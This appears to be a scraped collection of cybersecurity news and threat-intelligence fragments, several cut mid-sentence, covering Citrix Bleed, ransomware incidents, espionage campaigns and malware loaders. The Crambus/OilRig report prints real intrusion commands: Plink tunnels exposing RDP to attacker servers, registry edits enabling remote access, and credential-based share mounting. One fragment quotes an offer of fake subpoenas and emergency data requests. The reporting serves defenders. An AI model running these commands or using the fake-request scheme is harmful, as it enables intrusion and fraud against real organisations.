and frustration."

      "text": " A proof-of-concept (PoC) exploit is released for the 'Citrix Bleed' vulnerability, tracked as CVE-2023-4966, that allows attackers to retrieve authentication session cookies from vulnerable Citrix NetScaler ADC and NetScaler Gateway appliances.The CVE-2023-4966 Citrix Bleed flaw is an unauthenticated buffer-related vulnerability affecting Citrix NetScaler ADC and NetScaler Gateway, network devices used for load balancing, firewall implementation, traffic management, VPN, and user authentication.By analyzing the unpatched (13.1-48.47) and patched versions (13.1-49.15) of NetScaler, Assetnote found 50 function changes.Among these functions, the researchers found two ('ns_aaa_oauth_send_openid_config' and 'ns_aaa_oauthrp_send_openid_config') that featured additional bounds checks preceding the generation of a response.These functions use 'snprintf' to insert the appropriate data into the generated JSON payload for the OpenID configuration. In the pre-patch version, the response is sent immediately without checks.The vulnerability emerges from the return value of the snprintf function, which can lead to a buffer over-read if exploited.The patched version ensures that a response will only be sent if snprintf returns a value lower than 0x20000.Armed with that knowledge, Assetnote's analysts attempted to exploit vulnerable NetScaler endpoints.During that process, they found that the hostname value used for generating the payload comes from the HTTP Host header, so one does not need administrator rights to access it.Furthermore, the hostname is inserted into the payload six times. Hence, its exploitation makes it possible to exceed the buffer limit, forcing the endpoint to respond with the buffer's contents and adjacent memory.\"While a lot of it was null bytes, there was some suspicious-looking information in the response.\"By exploiting the vulnerability thousands of times for testing, the analysts consistently located a 32-65 byte long hex string that is a session cookie.Retrieving that cookie makes it possible for attackers to hijack accounts and gain unrestricted access to vulnerable appliances.Now that a CVE-2023-4966 exploit is publicly available, it is expected that threat actors will increase their targeting of Citrix Netscaler devices to gain initial access to corporate networks.As these types of vulnerabilities are commonly used for ransomware and data theft attacks, it is strongly advised that system administrators immediately deploy patches to resolve the flaw."

Over 52 million patient records were compromised, it said.Downtime varied from minimal disruption for those with frequent data backups, to months of recovery time, although the average was 14 days per organization. At nearly 19 days, 2023 is the worst year for downtime during the reporting period, followed by 2022 (16 days).Based on these figures, ransomware attacks since 2016 may have caused as many as 6347 days, or 17.4 years, of downtime.Ransom demands varied significantly, from $1600 to $10m, and were highest on average in 2021 ($4m). However, the researchers were unable to calculate or even estimate how much was lost by organizations because most victims don’t want to disclose the size of their ransom payments.Comparitech warned that there would likely be no letup in attacks in the final quarter of 2023.“With healthcare organizations witnessing an average of 18.7 days of downtime in 2023, it’s clear that hackers aren’t just succeeding in data theft but are managing to cause unprecedented disruption with their malware.”"

NDAs, contracts, confidential letters. Contractual agreements with players are also allegedly included in the stolen data set.The NoEscape ransomware gang is using this stolen data as leverage, threatening to publish it by October 20, 2023, unless ASVEL contacts them to negotiate a ransom payment.ASVEL says they retained cybersecurity specialists who, on October 18, 2023, confirmed that the attackers breached the club's systems and stole data.Although the breach did not impact the club's operations, it is assessing the harm to third parties with data exposed in this incident.One concern is the payment details of those who bought tickets, merchandise, and club membership cards from the official website. As of today, ASVEL says it has no evidence that the attackers have stolen its fans' payment data or bank account details.The incident has been reported to CNIL (Commission Nationale de l'Informatique et des Libertés), France's national data protection authority, and a formal complaint is soon to be submitted to law enforcement authorities.It is worth noting that ASVEL has been removed from NoEscape's darknet portal, and the link to the original entry now returns a 404 error.

They also exposed users to potential identity theft and financial fraud.OAuth, a widely adopted user authorization and authentication technology, simplifies the sign-in process by allowing users to log in to websites using their social media accounts. The security flaws in these implementations enabled attackers to insert a token from another site as a verified token, a technique referred to as a “Pass-The-Token Attack.”“The thing that stood out most in our research is the fact that OAuth, which is the main technology behind social-login, is actually well designed and contains no obvious fail-points.

Between June 20 and 29, the threat actors stole 767k files containing 690 GB of data, including BHI's Windows Active Directory database.Finally, on June 29, 2023, having stolen all data they could from BHI's network, the threat actors deployed the Akira ransomware on all devices to encrypt files. This was when BHI's IT team realized the company had been compromised.The firm says they immediately informed law enforcement and engaged with external experts to help them recover the impacted systems. The threat actor's foothold on BHI's network was removed on July 7, 2023.The company says it was able to recover data from a cloud backup solution that hadn't been affected by the ransomware attack, so they were able to restore their systems without paying a ransom.Additionally, BHI bolstered its security measures by imposing multi-factor authentication on VPN access, performing a global password reset, extending the deployment of EDR and AV tools to cover all sections of its environment, and decommissioning legacy systems.While BHI was able to recover its systems, the threat actors could steal data containing employees' personal information.An investigation concluded on September 1, 2023, indicates that the following data was stolen:At the time of writing this, Akira ransomware has not leaked any data belonging to BHI on its extortion portal on the dark web, and neither have the cybercriminals announced BHI in their upcoming data leaks.The data breach notices enclose instructions on enrolling in a two-year identity theft protection service through Experian."

Additional submission of fake papers will be required during the subpoena process. Court orders/search warrants, M.L.A.T.s, and seizure warrants (which may permit account takeover but have not yet been tested) are a few possible papers. – Emergency Data Request: Issued in situations where there is a significant risk to human life, this request type doesn’t require falsified paperwork but comes with a significantly lower success rate and less comprehensive information. – Post Removal/Account suspension: Applicable when a user’s post is in violation of any law, to any degree, where you may request that the user’s account be suspended or that their post be taken down.”\nCopyright@securityaffairs 2023 "

      "text": " The International Criminal Court provided additional information about the cyberattack five weeks ago, saying that it was a targeted operation for espionage purposes.As an international tribunal, the International Criminal Court (ICC) is seated in The Hague, Netherlands, and its attributions are to investigate, and to hold accountable individuals committing crimes of concern to the international community.In a statement on Friday, the ICC shared new details about the action it took following the cyberattack and some initial results from the forensic analysis of the incident.Current evidence is insufficient to attribute the attack, ICC said in a statement, adding that the Dutch law enforcement is currently running the criminal investigation.The impact of the attack remains unclear at the moment and no evidence so far points to data entrusted to the Court being compromised. Should such evidence emerge, affected parties will be contacted immediately with direct messages from the Court.The ICC ICC says that it has already taken “all necessary steps to address any compromise to data belonging to individuals, organisations and States,” and will continue to do so.ICC is reinforcing its risk management framework and preparing for potential repercussions from the cyberattack, such as security risks to victims and witnesses. Steps for improving digital security have also been accelerated.The recent cyberattack occurred at a “time of broader and heightened security concerns for the Court,” with daily and persistent attempts to disrupt ICC’s systems and criminal proceedings initiated against several elected officials, including Judges of the Court and the Prosecutor."

      "text": " A new sophisticated threat tracked as ‘TetrisPhantom’ has been using compromised secure USB drives to target government systems in the Asia-Pacific region.Secure USB drives store files in an encrypted part of the device and are used to safely transfer data between systems, including those in an air-gapped environment.Access to the protected partition is possible through custom software that decrypts the contents based on a user-provided password. One such software is UTetris.exe, which is bundled on an unencrypted part of the USB drive.Security researchers discovered trojanized versions of the UTetris application deployed on secure USB devices in an attack campaign that has been running for at least a few years and targeting governments in the APAC region.Kaspersky shared additional details with BleepingComputer, explaining that the attack with the trojanized Utetris app starts with executing on the target machine a payload called AcroShell.AcroShell establishes a communication line with the attacker’s command and control (C2) server and can fetch and run additional payloads to steal documents and sensitive files, and collect specific details about the USB drives used by the target.The threat actors also use the information gathered this way for research and development of another malware called XMKR and the trojanized UTetris.exe.\"The XMKR module is deployed on a Windows machine and is responsible for compromising secure USB drives connected to the system to spread the attack to potentially air-gapped systems\" - KasperskyXMKR’s capabilities on the device include stealing files for espionage purposes and the data is written on the USB drives.The information on the compromised USB is then exfiltrated to the attacker's server when the storage device plugs into an internet-connected computer infected with AcroShell.Kaspersky retrieved and analyzed two malicious Utetris executable variants, one used  between September and October 2022 (version 1.0) and another deployed in government networks from October 2022 until now (version 2.0).Kaspersky says these attacks have been ongoing for at least a few years now, with espionage being TetrisPhantom's constant focus. The researchers observed a small number of infections on government networks, indicating a targeted operation."

      "text": " Deputy Editor, Infosecurity MagazineVietnam-based cybercriminals are believed to be behind to attacks using DarkGate malware, which have targeted organizations in the UK, US and India since 2018.The DarkGate and Ducktail campaigns have been linked together based on non-technical indicators observed by the researchers. These include lure files, themes, targeting and delivery methods. For example, the initial vector is frequently a LinkedIn message, which redirects the victim to a malicious file on Google Drive.WithSecure also analyzed associated metadata, including LNK File metadata, PDFs created using the Canva design service/tool and MSI files created using an unlicensed version of EXEMSI.WithSecure Senior Threat Intelligence Analyst Stephen Robinson, commented: “The DarkGate attacks we observed have very strong identifiers which allowed us to establish links between these attacks and others we’ve seen using different infostealers and malware, including Ducktail. Based on what we’ve observed, it is very likely that a single actor is behind several of the campaigns we’ve been tracking that target Meta Business accounts.”The researchers have also linked the Lobshot and Redline Stealer malware to the same Vietnam-based threat actors.Robinson highlighted how the growth of cybercrime-as-a-service (CaaS) industry has made it harder to identify the groups behind specific campaigns.“DarkGate has been around for a long time and is being used by many groups for different purposes, and not just this group or cluster in Vietnam. The flip side of this is that actors can use multiple tools for the same campaign, which could obscure the true extent of their activity from purely malware-based analysis,” he noted."

      "title": "Crambus: New Campaign Targets Middle Eastern Government | Symantec Enterprise Blogs",
      "text": " The Iranian Crambus espionage group (aka OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023. During the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results  to the attackers. Malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more.In addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP). There is also evidence the attackers modified Windows firewall rules in order to enable remote access.Crambus is a long-running Iranian espionage group that has mounted operations against targets in multiple countries, including Saudi Arabia, Israel, the United Arab Emirates, Iraq, Jordan, Lebanon, Kuwait, Qatar, Albania, the U.S., and Turkey.The group is known to stage long-running intrusions for intelligence gathering and spying purposes. In recent years it has added a heavy social engineering component to the early stages of its attacks.During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus. In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools.The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\\public\\sat. The same script was executed multiple times on the same computer (Computer 1) over the next seven days. Four days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure port-forwarding rules allowing for RDP access from a remote host:CSIDL_PROFILE\\public\\sat\\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED]This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12.On February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections.netstat /anThe netstat command line switches perform the following actions:Next, Plink (mssh.exe) was launched again to enable remote RDP access. After this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network.On April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\\public directory and was used to forward port 3389 to port 999 on all available interfaces:CSIDL_PROFILE\\public\\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389The options supplied in the command perform the following actions:At the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\\public directory.cmd /c CSIDL_PROFILE\\public\\p2.bat > CSIDL_PROFILE\\public\\001.txt 2>&1Immediately afterwards, the same Plink command was run a second time. This is followed by the same unknown batch script being executed several more times.Later that day, Mimikatz was executed from the %TEMP% directory to dump credentials.On April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4):netstat /aonThe “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port. The command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections. Three hours later, Mimikatz was run again to dump credentials.The next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3. This was followed by a Plink command: plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389The options perform the following actions:The command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally. On April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor.Tokel (file name: telecomm.exe) was executed. On May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1).Malicious activity appeared to cease for nearly a month until June 4, when Backdoor.Tokel was executed again on Computer 3. On June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1).On June 20, Backdoor.PowerExchange (file name: setapp.ps1) was run on Computer 3.The PowerShell-based backdoor is designed to execute commands received from the attackers. This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email’s that contain “@@” in the subject line are read by Backdoor.PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C.The script allows four commands to execute:The attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior. On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine. The next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports. It's possible the attackers were checking that the SSH tunnel was still active.On July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). The service was configured to auto-start during the boot up process. Over the next two days, July 9 and 10, another new piece of malware named Trojan.Dirps (file name: virtpackage.exe) was repeatedly executed on Computer 3. On July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer.Clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents. The next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials. On July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1). On July 18, the attackers again executed Infostealer.Clipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services. This SSH tunnel was created again on August 3.On August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4). Immediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network. While this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules. CSIDL_SYSTEM\\netsh.exe advfirewall firewall show rule name=[REMOVED] verboseFollowing this, another PowerShell script was executed. The script appeared to be designed to query and collect information about local user groups and their members on a Windows system. Its output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.SID,'|',$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.Name,'|',$m.ObjectClass,'|',$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;};After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access.On August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \\ProgramData\\Adobe.exe. On August 30, the attackers obtained access to a second web server (Web Server 2). They first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90). They then installed Infostealer.Clipog using a different file name (fs-tool.exe). The next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt). There may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345.On September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine. They then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2. On September 2, the attackers ran the following netstat command on Web Server 2:netstat -aThis command is used to list all active connections. The unknown PowerShell script (file name: joper.ps1) was then run again.On September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed:;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\extcap\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\dumpcap.exe; -D -Z noneWireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file. Similarly, dumpcap was used to capture network packets.Usbpcapcmd:Dumpcap:It appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine. Immediately afterwards, a suspicious netstat command ran:netstat -a –nThis will list all active connections and print them to standard output in numerical form.After joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands:reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /freg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /freg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /fcmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /fcmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /fThese commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP.A few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials.;CSIDL_SYSTEM\\net.exe; use \\\\[REMOVED]\\c$ /user:[REMOVED] [REMOVED]On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2. They then turned their attention back to Computer 1, where a new variant of the Backdoor.Tokel malware was installed on the computer. The next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares. They then executed Backdoor.Tokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10). Malicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares.If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.4d04ad9d3c3abeb61668e52a52a37a46c1a60bc8f29f12b76ff9f580caeefba8 – Backdoor.Tokel41672b08e6e49231aedf58123a46ed7334cafaad054f2fd5b1e0c1d5519fd532 –

      "text": " The Iranian hacking group tracked as OilRig (APT34) breached at least twelve computers belonging to a Middle Eastern government network and maintained access for eight months between February and September 2023.The attacks observed by Symantec's threat hunter team, part of Broadcom, were used to steal passwords and data, as well as to install a PowerShell backdoor dubbed 'PowerExchange', which accepted commands from execution via Microsoft Exchange.After executing the arbitrary PowerShell commands that typically concern file writing or exfiltration actions, the malware moves the messages to 'Deleted Items' to minimize the likelihood of detection. The output of the executed commands is then emailed back to the threat actors.Exchange as a backdoor in these attacks enables APT34 activities to blend in with typical network traffic and minimize the number of introduced implants.Other tools used by APT34 in the recent campaign include:The attacks observed by Symantec began on February 1, 2023, and utilize a wide assortment of malware, tools, and malicious activity that lasted for 8 months.It started with the introduction of a PowerShell script (joper.ps1), which ran multiple times over the first week.On February 5, the attackers compromised a second computer in the network and used a masqueraded version of Plink ('mssh.exe') to configure RDP access. On February 21, execution of the 'netstat /an' command was observed on a web server.In April, OilRigs compromised two more systems, executing unknown batch files ('p2.bat') and deploying Mimikatz to capture credentials.In June, the hackers executed Backdoor.Tokel and PowerExchange on the breached machines, signifying the start of the main phase of the attack.The next month, the hackers deployed TrojanDirps and Infostealer.Clipog, and set up SSH tunnels with Plink.In August, the hackers performed Nessus scans for Log4j vulnerabilities, and by the end of the month, they compromised a second web server, installing Infostealer.Clipog on it.On September 1, the attacks compromised three more computers, using certutil to download Plink on them and run Wireshark commands on the second webserver to capture network and USB traffic packets.Two more computers were breached on September 5, executing the Backdoor.Token implant on them.Activity on the second web server continued until September 9, 2023, with the attackers executing an unknown PowerShell script ('joper.ps1') and performing network shares mounting/unmounting.Although Symantec says it observed malicious activity in at least 12 computers on the victim's network, they have evidence that backdoors and keyloggers were deployed on dozens more.In summary, OilRigs utilizes a mix of tools, scripts, and techniques to expand their access and maintain persistence across multiple systems in a compromised network.Their activities combine reconnaissance (e.g., netstat commands), lateral movement (e.g., Plink for RDP), and data exfiltration/harvesting (e.g., Mimikatz, Infostealer.Clipog), which highlights the threat group's broad-spectrum capabilities.Symantec concludes that despite OilRigs facing an existential threat in 2019 when its toolset leaked, it is clear from these lengthy attacks that the threat actors remain as active as ever."

These companies would then take remote access of the victim's computer & convince the victim of presence of non-existing problems and then allegedly make them pay hundreds of Dollars for unnecessary services.\"In the past year alone, these scams led to losses exceeding $800 million for more than 32,000 victims across the United States.Additionally, the CBI uncovered a cryptocurrency fraud ring associated with a fake crypto-mining operation that targeted Indian nationals, resulting in losses of at least Rs. 100 crore (1 Billion Indian Rupees), worth approximately $12 million.During the investigation, Indian authorities identified 150 accounts linked to this cryptocurrency crime ring, comprising accounts from 46 shell companies, 42 proprietorship firms, and 50 individual accounts, all used to collect illegally obtained funds.The CBI says the scammers developed a fake cryptocurrency token, luring investors with promises of significant profits from investments in Bitcoin and other cryptocurrencies.They allegedly created a website to mislead investors into believing their funds would be used to acquire mining machines, with the profits generated from the mined cryptocurrency to be distributed among investors.While, initially, the investors received returns to establish trust, the operation stopped running in August 2021 after collecting payments from unsuspecting Indian citizens who invested through various payment gateways.\"Based on evidence gathered during Operation Chakra-II, law enforcement agencies internationally are being notified of details of identified victims, Shell companies, identified money mules, identified proceeds of crime, details of co-accused/ support elements for comprehensive action to dismantle these criminal networks,\" the CBI said.\"We are proud of our long-standing collaboration with law enforcement to combat Tech Support Fraud, which has resulted in 30-plus call center raids and 100-plus arrests to date,\" Hogan-Burney said."

However, its combination with Google Ads abuse can signify a new dangerous trend in the field.Punycode is an encoding method used to represent Unicode characters, helping convert hostnames in non-Latin scripts (Cyrillic, Arabic, Greek, Chinese, etc.) to ASCII to make them understandable to the DNS (Domain Name System).For example, \"München\" would be converted to \"Mnchen-3ya,\" \"α\" would become \"mxa,\" \"правда\" would be \"80aafi6cg,\" and \"도메인\" would become \"hq1bm8jm9l.\"Threat actors abuse Punycode to register domain names that appear similar to legitimate sites but with one character using unicode, to look slightly different.This tiny visual glitch is unlikely to be perceived by most users visiting the decoy site but is a giveaway of the technique used in this case.Those clicking on any download links embedded on the fake site receive a digitally-signed MSI installer called 'KeePass-2.55-Setup.msix' that includes a PowerShell script associated with the FakeBat malware loader.While Google has removed the original Punycode advertisement seen by Malwarebytes, BleepingComputer found additional ongoing KeePass ads in the same malware campaign.This advertisement, though, leads to a domain called keeqass[.]info, as shown in the image below.Like the Punycode domain, this site pushes the same MSIX file that includes the same FakeBat PowerShell script to download and install malware on the Windows device.In BleepingComputer's tests, when executed, the FakeBat PowerShell script will download a GPG-encrypted RAR archive, decrypt it, and extract it to the %AppData% folder.In the file analyzed by BleepingComputer, the script will launch a file named 'mergecap.exe' from the archive.BleepingComputer has found other popular software impersonated in this malware campaign, including WinSCP and PyCharm Professional."

      "text": " The Ragnar Locker ransomware operation's Tor negotiation and data leak sites were seized Thursday morning as part of an international law enforcement operation.BleepingComputer has confirmed that visiting either website now displays a seizure message stating that a large assortment of international law enforcement from the US, Europe, Germany, France, Italy, Japan, Spain, Netherlands, Czech Republic, and Latvia were involved in the operation.\"This service has been seized as part of a coordinated law enforcement action against the Ragnar Locker group,\" reads the message.A Europol spokesperson has confirmed the seizure message is legitimate as part of an ongoing action targeting the Ragnar Locker ransomware gang and that a press release will be published tomorrow. The FBI declined to comment.Like other ransomware operations, Ragnar Locker would breach corporate networks, spread laterally to other devices while harvesting data, and then encrypt the computers on the network.The encrypted files and stolen data were used as leverage in double-extortion schemes to pressure a victim to pay.However, unlike most modern operations, Ragnar Locker was not considered a Ransomware-as-a-Service that actively recruited outside affiliates to breach networks and deploy the ransomware, earning a revenue share in the process.Instead, Ragnar Locker was semi-private, meaning they did not actively promote their operation to recruit affiliates but worked with outside pentesters to breach networks.The ransomware gang also conducts pure data theft attacks rather than deploying an encryptor, using their data leak site to extort the victim.It is unclear if this new operation is an offshoot of Ragnar Locker, or a rebrand, or if they bought the source code.UCA says they will share the ransomware gang's data with law enforcement."

      "text": " The BlackCat/ALPHV ransomware operation has begun to use a new tool named 'Munchkin' that utilizes virtual machines to deploy encryptors on network devices stealthily.Manchkin enables BlackCat to run on remote systems or encrypt remote Server Message Block (SMB) or Common Internet File (CIFS) network shares.The introduction of Munchkin to BlackCat's already extensive and advanced arsenal makes the RaaS more attractive to cybercriminals seeking to become ransomware affiliates.After compromising a device, the threat actors install VirtualBox and create a new virtual machine using the Munchkin ISO. This Munchkin virtual machine includes a suite of scripts and utilities that allow the threat actors to dump passwords, spread laterally on the network, build a BlackCat 'Sphynx' encryptor payload, and execute programs on network computers.Upon boot, it changes the root password to one known only by the attackers and leverages the 'tmux' utility to execute a Rust-based malware binary named 'controller' that begins to load scripts used in the attack.These scripts are listed below:The 'controller' uses the bundled configuration file, which provides access tokens, victim credentials, and authentication secrets, as well as configuration directives, folder and file blocklists, tasks to run, and hosts to target for encryption.This configuration is used to generate custom BlackCat encryptor executables in the /payloads/ directory, which are then pushed to remote devices to encrypt files or encrypt SMB and CIFS network shares.Unit 42 discovered a message in the malware's code from BlackCat's authors to their partners, warning against leaving the ISO on target systems due to the lack of encryption for the configuration, especially highlighting the risk of chat access token leakage.A common problem affecting ransomware victims and cybercriminals is that samples commonly get leaked through malware analysis sites. Analyzing the ransomware samples allows researchers to gain full access to the negotiation chat between a ransomware gang and its victim.To prevent this, affiliates provide Tor negotiation site access tokens at run-time when launching. Therefore, it's impossible to gain access to a victim's negotiation chat, even if they have access to the sample used in the attack.Due to this, the threat actors warn affiliates that they must delete the Munchkin virtual machines and ISOs to prevent these access tokens from leaking.The developers also include instructions and tips on using 'Controller' to monitor the attack's progress and launch tasks.Munchkin makes it easier for BlackCat ransomware affiliates to perform various tasks, including bypassing security solutions protecting the victim's device. This is because virtual machines provide a layer of isolation from the operating system, making detection and analysis more challenging for security software.Additionally, the choice of Alpine OS ensures a small digital footprint, and the tool's automated operations reduce the need for manual interventions and noise from command feeds.Finally, the modularity of Munchkin, featuring a variety of Python scripts, unique configurations, and the ability to swap payloads as needed, makes the tool easy to adjust to specific targets or campaigns."

Therefore, it assesses this activity as posing “a significantly high risk” to affected organizations.Based on the profile of organizations affected by these intrusions so far, the researchers believe the attackers may be opportunistically compromising vulnerable servers. “However, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments,” read the advisory.Microsoft highlighted the different focuses and approaches of the two North Korean threat actors. Diamond Sleet primarily targets media, IT services and defense-related entities around the world for the purposes of espionage, data theft, financial gain and network destruction.Once it has compromised TeamCity servers, the group deploys ‘ForestTiger’ malware to execute commands on the breached server. Another attack path used by Diamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure to carry out DLL search-order hijacking.Onyx Sleet’s main targets are defense and IT services organizations in South Korea, the US, and India. It has developed a set of tools that enables it to establish persistent access to victim environments and remain undetected.Following successful exploitation of the TeamCity vulnerability, the group deploys a proxy tool known as HazyLoad to establish a persistent connection between the compromised host and attacker-controlled infrastructure.Microsoft set out a range of actions for organizations using TeamCity to take to prevent and respond to these attacks, including:"

The attacker is also clearing logs and removing users, probably to hide their activity.The researchers believe that behind these attacks is only one threat actor but could not determine the initial delivery mechanism.Cisco has not disclosed additional details about the attacks but promised to offer more information when it completes the investigation and when a fix is available."

Only 36% of recipients successfully identified and reported the simulated attack, leaving the majority of organizations vulnerable to phishing threats. The retail industry had the highest miss rate, with only 2 in 10 employees engaging with the benchmark, while legal and business services outperformed others in identifying and reporting suspicious QR codes.As per the Hoxhunt Challenge, job function also affected employee susceptibility, with communications staff being 1.6 times more likely to engage with a QR code attack. In contrast, employees with legal responsibilities were the most vigilant.Engaged employees (defined as those who feel passionate about their jobs) had a miss rate of 40%, a stark contrast from those not actively invested in their job responsibilities and the organization, who had a miss rate of 90%. Additionally, employees who completed onboarding and received pre-training also displayed better vigilance in identifying phishing emails. "

Evidence suggests that the attacker accessed customers' personal information a day later, on October 12.The exposed data includes customer names, email addresses, countries of residence, service usage details, and purchase information such as payment methods, license codes, and order specifics.Casio says that credit card information was not stored within the compromised database.As of October 18, the attackers accessed 91,921 items belonging to Japanese customers (including individuals and 1,108 educational institution customers) and 35,049 records belonging to customers from 148 countries and regions outside Japan.\"Casio believes these were the causes of the situation that allowed an external party to gain unauthorized access.\"Although the compromised database is currently \"inaccessible to external entities,\" the ClassPad.net app remains operational. Casio clarified that the hackers did not infiltrate systems beyond the compromised database within the development environment.On Monday, October 16, Casio reported the incident to Japan's Personal Information Protection Commission and is collaborating with law enforcement authorities, assisting with their breach investigation.Additionally, Casio is working with external cybersecurity and forensics experts to conduct an internal investigation to find the underlying causes of the incident and draw up countermeasures in response to the breach.In early August, a threat actor (known as thrax) claimed to have leaked over 1.2 million user records on the BreachForums cybercrime forum, allegedly stolen from a Remote Desktop Services (RDS) server with older casio.com databases.​The allegedly stolen information contains entries up to July 2011, AWS keys, and database credentials.\"This DB is kinda old as hell, but believe it or not, this was dumped from a live RDS server today.

